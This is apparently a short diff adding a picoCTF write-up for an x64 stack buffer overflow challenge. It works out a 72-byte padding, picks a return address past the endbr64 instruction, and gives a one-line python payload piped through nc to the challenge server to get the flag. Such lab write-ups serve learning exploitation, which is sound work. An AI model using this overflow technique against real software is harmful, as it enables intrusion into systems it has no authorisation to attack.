@@ -1,0 +1,16 @@
+im more used to x64 exploiting and assembly
+than x86 so this plot twist the author 
+has implemented actually worked in my favor
+
+we read the stack is x40 which is 64 bytes
+the rbp pushed is 8 so the padding is 72
+
+we want to avoid the intel control expansion
+instruction set's endbr64 so we jump ahead of
+it to 0x40123b, we make our payload and
+send it through the command line so 
+that i dont bother writing a .py file
+
+ python -c "import sys; sys.stdout.buffer.write(b'='*72 + b'\x3b\x12\x40\x00\x00\x00\x00\x00\x0a')" | nc saturn.picoctf.net 55141 1>flag
+
+ and we get the flag
